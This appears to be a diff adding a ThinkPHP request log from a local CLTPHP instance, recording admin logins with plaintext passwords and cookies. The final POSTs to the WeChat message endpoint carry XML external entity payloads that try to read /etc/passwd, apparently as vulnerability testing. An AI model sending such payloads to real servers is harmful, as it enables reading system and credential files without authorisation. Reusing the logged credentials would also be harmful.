+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /var/www/html/app/admin/lang/zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:26:44+08:00 ] 172.17.0.1 GET /admin/login/index.html
+[ info ] 127.0.0.1/admin/login/index.html [运行时间：0.045995s][吞吐率：21.74req/s] [内存消耗：393.16kb] [文件加载：42]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /var/www/html/app/admin/lang/zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /var/www/html/app/admin/controller/Login.php ]
+[ info ] [ VIEW ] /var/www/html/app/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:26:44+08:00 ] 172.17.0.1 GET /captcha.html
+[ info ] 127.0.0.1/captcha.html [运行时间：0.043257s][吞吐率：23.12req/s] [内存消耗：322.30kb] [文件加载：32]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'method',
+  'method' => 
+  array (
+    0 => '\\think\\captcha\\CaptchaController',
+    1 => 'index',
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'referer' => 'http://127.0.0.1/admin/login/index.html',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+  'id' => NULL,
+)
+[ info ] [ RUN ] think\captcha\CaptchaController->index[ /var/www/html/vendor/topthink/think-captcha/src/CaptchaController.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:26:53+08:00 ] 172.17.0.1 POST /admin/login/index.html
+[ info ] 127.0.0.1/admin/login/index.html [运行时间：0.115983s][吞吐率：8.62req/s] [内存消耗：670.63kb] [文件加载：50]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'content-length' => '47',
+  'accept' => '*/*',
+  'origin' => 'http://127.0.0.1',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'referer' => 'http://127.0.0.1/admin/login/index.html',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'admin',
+  'password' => 'yuanlaoshi',
+  'captcha' => 'nc4t',
+)
+[ info ] [ LANG ] /var/www/html/app/admin/lang/zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /var/www/html/app/admin/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001307s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_admin` [ RunTime:0.000798s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_admin` WHERE  `username` = 'admin' LIMIT 1 [ RunTime:0.000384s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:26:53+08:00 ] 172.17.0.1 GET /captcha.html?id=0.8359940227822977
+[ info ] 127.0.0.1/captcha.html?id=0.8359940227822977 [运行时间：0.032964s][吞吐率：30.34req/s] [内存消耗：322.51kb] [文件加载：32]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'method',
+  'method' => 
+  array (
+    0 => '\\think\\captcha\\CaptchaController',
+    1 => 'index',
+  ),
+  'var' => 
+  array (
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'referer' => 'http://127.0.0.1/admin/login/index.html',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+  'id' => NULL,
+)
+[ info ] [ RUN ] think\captcha\CaptchaController->index[ /var/www/html/vendor/topthink/think-captcha/src/CaptchaController.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:30:22+08:00 ] 172.17.0.1 POST /admin/login/index.html
+[ info ] 127.0.0.1/admin/login/index.html [运行时间：0.108251s][吞吐率：9.24req/s] [内存消耗：695.30kb] [文件加载：54]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'login',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'content-length' => '45',
+  'accept' => '*/*',
+  'origin' => 'http://127.0.0.1',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'referer' => 'http://127.0.0.1/admin/login/index.html',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+  'username' => 'admin',
+  'password' => 'admin123',
+  'captcha' => 'r4pk',
+)
+[ info ] [ LANG ] /var/www/html/app/admin/lang/zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /var/www/html/app/admin/controller/Login.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001372s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_admin` [ RunTime:0.001700s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_admin` WHERE  `username` = 'admin' LIMIT 1 [ RunTime:0.000470s ]
+[ error ] [8]未定义数组索引: avatar[/var/www/html/app/admin/model/Admin.php:12]
+---------------------------------------------------------------
+[ 2018-07-05T23:30:25+08:00 ] 172.17.0.1 GET /admin/index/index.html
+[ info ] 127.0.0.1/admin/index/index.html [运行时间：0.089075s][吞吐率：11.23req/s] [内存消耗：660.95kb] [文件加载：57]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'http://127.0.0.1/admin/login/index.html',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /var/www/html/app/admin/lang/zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Index->index[ /var/www/html/app/admin/controller/Index.php ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /var/www/html/app/admin/view/index/index.html [ array (
+  0 => 'menus',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000438s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_auth_rule` [ RunTime:0.000947s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_auth_rule` WHERE  (  menustatus=1 ) ORDER BY `sort` [ RunTime:0.000519s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:30:25+08:00 ] 172.17.0.1 GET /admin/Index/main.html
+[ info ] 127.0.0.1/admin/Index/main.html [运行时间：0.045668s][吞吐率：21.90req/s] [内存消耗：522.76kb] [文件加载：50]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'Index',
+    2 => 'main',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'http://127.0.0.1/admin/index/index.html',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /var/www/html/app/admin/lang/zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\admin\controller\Index->main[ /var/www/html/app/admin/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /var/www/html/app/admin/view/index/main.html [ array (
+  0 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000369s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SELECT VERSION() AS ver [ RunTime:0.000207s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:30:58+08:00 ] 172.17.0.1 GET /wchat/wchat/getMessage.html
+[ info ] 127.0.0.1/wchat/wchat/getMessage.html [运行时间：0.081166s][吞吐率：12.32req/s] [内存消耗：545.95kb] [文件加载：46]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => 'getMessage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wchat\controller\Wchat->getMessage[ /var/www/html/app/wchat/controller/Wchat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001140s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000648s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000338s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:31:04+08:00 ] 172.17.0.1 GET /wchat/wchat/
+[ info ] 127.0.0.1/wchat/wchat/ [运行时间：0.082613s][吞吐率：12.10req/s] [内存消耗：543.86kb] [文件加载：49]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'UM_distinctid=16121070c59257-0fcede727de3bb-32647403-13c680-16121070c5a581; CNZZDATA400379=cnzz_eid%3D2126425842-1516677567-%26ntime%3D1516691436; Hm_lvt_2ca0b0d15f83707f9a4b65802faf0f48=1516960997; CNZZDATA1261321738=1744104691-1516943081-http%253A%252F%252F127.0.0.1%253A8080%252F%7C1520591227; PHPSESSID=5mp0tk13gjuocf6dbstnack9k2',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001125s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000822s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000278s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:32:02+08:00 ] 172.17.0.1 POST /wchat/wchat/getMessage.html
+[ info ] gate/wchat/wchat/getMessage.html [运行时间：0.056578s][吞吐率：17.67req/s] [内存消耗：544.54kb] [文件加载：46]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => 'getMessage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'gate',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'https://gate/dana/home/starter.cgi',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'DSID=22c7b390ca6e598b27c6fe1327ebbc1c; DSFirstAccess=1530613063; DSSIGNIN=url_default; DSLastAccess=1530613064',
+  'content-length' => '265',
+)
+[ info ] [ PARAM ] array (
+  '<!DOCTYPE_convert_' => 
+  array (
+    ' 
+<!ENTITY remote SYSTEM "file:///etc/passwd">
+' => '"version">e</param>
+        <param name="action">',
+  ),
+  'remote;</param>
+________<param_name' => '"result">aaa</param>
+        <param name="join_url">aaa</param>
+</root>
+
+',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wchat\controller\Wchat->getMessage[ /var/www/html/app/wchat/controller/Wchat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000350s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000642s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000192s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:32:43+08:00 ] 172.17.0.1 POST /wchat/wchat/getMessage.html
+[ info ] gate/wchat/wchat/getMessage.html [运行时间：0.048261s][吞吐率：20.72req/s] [内存消耗：957.90kb] [文件加载：46]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => 'getMessage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'gate',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'https://gate/dana/home/starter.cgi',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'DSID=22c7b390ca6e598b27c6fe1327ebbc1c; DSFirstAccess=1530613063; DSSIGNIN=url_default; DSLastAccess=1530613064',
+  'content-length' => '197',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="utf-8"?>  
+<!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>  
+<root><MsgType>text</MsgType> <ToUserName>',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wchat\controller\Wchat->getMessage[ /var/www/html/app/wchat/controller/Wchat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000428s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000699s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000220s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_key_replay` [ RunTime:0.000512s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000299s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000269s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media` [ RunTime:0.000468s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000241s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_media_item` [ RunTime:0.000451s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000268s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000203s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` LIKE '%%'  AND `match_type` = 1 LIMIT 1 [ RunTime:0.000263s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media` WHERE  `media_id` = 2 LIMIT 1 [ RunTime:0.000306s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_media_item` WHERE  `media_id` = 2 [ RunTime:0.000214s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:34:37+08:00 ] 172.17.0.1 POST /wchat/wchat/getMessage.html
+[ info ] gate/wchat/wchat/getMessage.html [运行时间：0.075132s][吞吐率：13.31req/s] [内存消耗：957.98kb] [文件加载：46]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wchat',
+    1 => 'wchat',
+    2 => 'getMessage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'gate',
+  'connection' => 'close',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'cache-control' => 'max-age=0',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'referer' => 'https://gate/dana/home/starter.cgi',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6',
+  'cookie' => 'DSID=22c7b390ca6e598b27c6fe1327ebbc1c; DSFirstAccess=1530613063; DSSIGNIN=url_default; DSLastAccess=1530613064',
+  'content-length' => '195',
+)
+[ info ] [ PARAM ] array (
+  '<?xml_version' => '"1.0" encoding="utf-8"?>  
+<!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>  
+<root><MsgType>text</MsgType> <ToUserName>aaa</ToUserName></root> 
+
+',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wchat\controller\Wchat->getMessage[ /var/www/html/app/wchat/controller/Wchat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000338s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_config` [ RunTime:0.000769s ]
+[ sql ] [ SQL ] SELECT `value` FROM `clt_wx_config` WHERE  `key` = 'SHOPWCHAT' LIMIT 1 [ RunTime:0.000223s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_wx_key_replay` [ RunTime:0.000642s ]
+[ sql ] [ SQL ] SELECT * FROM `clt_wx_key_replay` WHERE  `instance_id` = 0  AND `key` = ''  AND `match_type` = 2 LIMIT 1 [ RunTime:0.000198s ]
